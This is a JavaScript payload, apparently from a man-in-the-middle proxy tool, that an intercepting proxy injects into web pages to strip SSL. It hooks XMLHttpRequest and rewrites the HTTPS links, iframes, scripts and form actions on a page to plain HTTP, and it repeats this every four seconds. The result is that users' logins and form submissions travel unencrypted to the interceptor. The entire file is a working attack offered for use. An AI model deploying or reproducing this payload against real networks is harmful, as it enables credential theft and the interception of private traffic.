/*
  Hooks XMLHttpRequest as well as 'a', 'form', 'script' & 'iframe' nodes.

  Remember that any occurrence of 'obf_path_ssl_log', 'obf_path_callback' and
  'obf_path_whitelist' in this payload will be replaced when the proxy module
  loads and that variable names 'obf_var_target_hosts' and 'obf_var_replacement_hosts'
  are already declared before this is injected.
*/

var obf_func_open = XMLHttpRequest.prototype.open;

function obf_func_hook_XMLHttpRequest() {
  XMLHttpRequest.prototype.open = function(
    obf_var_method,
    obf_var_url,
    obf_var_async,
    obf_var_username,
    obf_var_password
  ) {
    obf_var_url = obf_var_url.replace(/(http)s/ig, "$1");
    return obf_func_open.apply(this, arguments);
  }
}

function obf_func_hook_nodes() {
  document.querySelectorAll("a,iframe,script,form").forEach(function(obf_var_node){
    try {
      switch (obf_var_node.tagName) {
        case "A":
          if (obf_var_node.href && obf_var_node.href.match(/^\s*https:/i)) {
            obf_var_node.href = obf_var_node.href.replace(/(http)s/i, "$1");
          }
          break;
        case "IFRAME":
          if (obf_var_node.src && obf_var_node.src.match(/^\s*https:/i)) {
            obf_var_node.src = obf_var_node.src.replace(/(http)s/i, "$1");
          }
          break;
        case "SCRIPT":
          if (obf_var_node.src && obf_var_node.src.match(/^\s*https:/i)) {
            obf_var_node.src = obf_var_node.src.replace(/(http)s/i, "$1");
          }
          break;
        case "FORM":
          if (obf_var_node.action && obf_var_node.action.match(/^\s*https:/i)) {
            obf_var_node.action = obf_var_node.action.replace(/(http)s/i, "$1");
          }
          break;
      }
    } catch(obf_var_ignore) {}
  });
}

try {
  obf_func_hook_XMLHttpRequest();
} catch(obf_var_ignore) {}

try {
  obf_func_hook_nodes();
} catch(obf_var_ignore) {}

try {
  obf_func_hook_XMLHttpRequest();
  document.addEventListener("DOMContentLoaded", obf_func_hook_nodes);
  self.addEventListener("load", obf_func_hook_nodes);
  setInterval(obf_func_hook_nodes, 4000);
} catch(obf_var_ignore) {}

